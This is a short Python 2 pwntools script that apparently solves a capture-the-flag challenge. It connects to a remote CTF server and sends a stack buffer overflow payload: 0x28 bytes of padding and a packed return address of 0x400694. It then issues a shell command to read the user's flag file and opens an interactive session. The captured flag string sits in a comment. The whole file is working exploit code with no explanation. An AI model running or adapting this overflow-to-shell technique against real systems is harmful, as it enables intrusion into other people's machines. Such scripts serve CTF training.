#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{vCa9cA1Gkp6BlV0ZrKIdHJlT8fabo6hE}


host , port = 'csie.ctf.tw' , 10125

y = remote(host,port)

y.sendline( 'D' * 0x28 + p64( 0x400694 ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

